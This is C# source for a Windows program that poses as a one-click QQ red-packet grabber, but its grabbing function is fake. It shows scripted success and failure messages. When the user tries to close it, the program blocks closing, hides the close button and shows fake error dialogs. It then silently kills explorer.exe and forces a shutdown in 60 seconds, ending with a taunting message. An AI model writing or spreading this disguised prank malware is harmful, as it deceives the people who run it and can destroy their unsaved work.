using System;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Reflection;

namespace 一键自动抢QQ红包
{
    public partial class Form : System.Windows.Forms.Form
    {
        public Form()
        {
            InitializeComponent();
        }

        private void Form_Load(object sender, EventArgs e)
        {
            this.comboBox.SelectedIndex = 0;
        }

        private void button_Click(object sender, EventArgs e)
        {
            this.Enabled = false;
            Thread.Sleep(2700);
            if (this.comboBox.SelectedIndex == 0)
            {
                MessageBox.Show("软件模拟失败，请尝试使用Win32API模拟。", "软件模拟失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("软件模拟成功!\r\n打开需要抢红包的群并挂机即可。\r\n点击右上红叉即可关闭程序。", "软件模拟成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.radioButton1.Enabled = this.comboBox.Enabled = this.button.Enabled = false;
            }
            this.Enabled = true;
        }

        bool close = false;

        private void Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (close)
            {
                return;
            }
            this.radioButton1.Enabled = this.comboBox.Enabled = this.button.Enabled = this.ControlBox = false;
            MessageBox.Show("找不到函数 “OnClosing” 的地址。", "函数调用失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("进程 “explorer.exe” 未响应。", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Type oleType = Type.GetTypeFromProgID("Shell.Application");
            object oleObject = Activator.CreateInstance(oleType);
            oleType.InvokeMember("ToggleDesktop", BindingFlags.InvokeMethod, null, oleObject, null);
            this.WindowState = FormWindowState.Normal;
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            process.StandardInput.WriteLine("start exit");
            process.StandardInput.AutoFlush = true;
            process.StandardInput.WriteLine("taskkill /im explorer.exe /f");
            process.StandardInput.WriteLine("shutdown /s /t 60 /f");
            process.StandardInput.WriteLine("exit");
            process.WaitForExit();
            MessageBox.Show("你有没有发现窗口右上角的关闭按钮不见了。\r\n除了这个窗口外其他窗口也都不见了。\r\n而且，资源管理器也没了。\r\n还有，你的电脑将在1分钟内关机。", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            close = true;
        }
    }
}
